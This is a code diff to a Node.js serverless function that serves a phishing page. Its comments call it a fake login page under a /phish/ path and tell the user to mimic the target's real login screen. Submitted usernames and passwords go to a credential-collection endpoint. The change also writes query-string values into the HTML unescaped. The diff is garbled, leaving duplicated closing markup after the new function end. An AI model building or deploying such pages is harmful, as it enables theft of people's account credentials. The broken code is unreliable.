@@ -4,8 +4,15 @@ const { parse } = require('url');
 // This serverless function serves the fake login HTML page.
 module.exports = async (req, res) => {
     // Extract the uniqueId from the URL path (e.g., /phish/abcdefg)
-    const { pathname } = parse(req.url);
-    const uniqueId = pathname.split('/').pop();
+    const { pathname, query } = parse(req.url, true); // parse(..., true) to get query params
+    const fullUniqueId = pathname.split('/').pop(); // This will be like "randomHash_requesterUserId"
+
+    // Extract username and password from query parameters if provided
+    const defaultUsername = 'user';
+    const defaultPassword = 'password123';
+
+    const embeddedUsername = query.u || defaultUsername; // 'u' for username
+    const embeddedPassword = query.p || defaultPassword; // 'p' for password
 
     // The HTML content for your fake login page.
     // CUSTOMIZE THIS to mimic the login page of your target!
@@ -27,14 +34,21 @@ module.exports = async (req, res) => {
     </head>
     <body>
         <div class="login-container">
-            <h2>Sign In</h2> <!-- Customize title -->
-            <form action="/submit-credentials/${uniqueId}" method="POST">
-                <input type="text" name="username" placeholder="Email or Phone" required> <!-- Customize placeholder -->
-                <input type="password" name="password" placeholder="Password" required>
+            <h2>Sign In</h2>
+            <form action="/submit-credentials/${fullUniqueId}" method="POST">
+                <input type="text" name="username" placeholder="${embeddedUsername}" value="${embeddedUsername}" required>
+                <input type="password" name="password" placeholder="${embeddedPassword}" value="${embeddedPassword}" required>
                 <button type="submit">Log In</button>
             </form>
             <p style="font-size: 12px; margin-top: 15px;"><a href="#" style="color: #1877f2; text-decoration: none;">Forgot password?</a></p>
         </div>
+    </body>
+    </html>
+    `;
+
+    res.setHeader('Content-Type', 'text/html');
+    send(res, 200, fakeLoginPageHtml);
+};        </div>
     </body>
     </html>
     `;
